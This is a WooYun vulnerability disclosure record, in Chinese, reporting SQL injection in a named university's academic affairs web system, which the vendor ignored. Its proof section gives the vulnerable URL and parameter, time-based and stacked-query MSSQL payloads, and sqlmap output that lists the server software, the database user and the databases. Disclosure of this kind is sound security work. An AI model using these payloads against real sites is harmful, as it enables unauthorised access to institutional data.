wybug_title: 某工业大学教务系统信息网SQL注入
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail: 漏洞详情 披露状态：   									2015-01-07：	细节已通知厂商并且等待厂商处理中									2015-01-12：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 注入 详细说明：  注入！   漏洞证明：  注入点:http://jxxx.ncut.edu.cn/notice.asp?lsh=1324Place: GETParameter: lsh    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: lsh=1324; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: lsh=1324 WAITFOR DELAY '0:0:5'-----[23:01:25] [INFO] testing Microsoft SQL Server[23:01:25] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errorsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n] Y[23:01:30] [INFO] confirming Microsoft SQL Server[23:01:37] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2000[23:01:37] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 14 times[23:01:37] [INFO] fetched data logged to text files under 'C:\Documents and Settings\Administrator\.sqlmap\output\jxxx.ncut.edu.cn'current user:    'student79'current database:    'JIAOWUSYSTEM'available databases [10]:[*] articles[*] bbs[*] chat[*] JIAOWUSYSTEM[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] tempdb   修复方案：  过滤参数！   版权声明：转载请注明来源 YuShen@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-01-12 13:12 厂商回复：  最新状态： 暂无
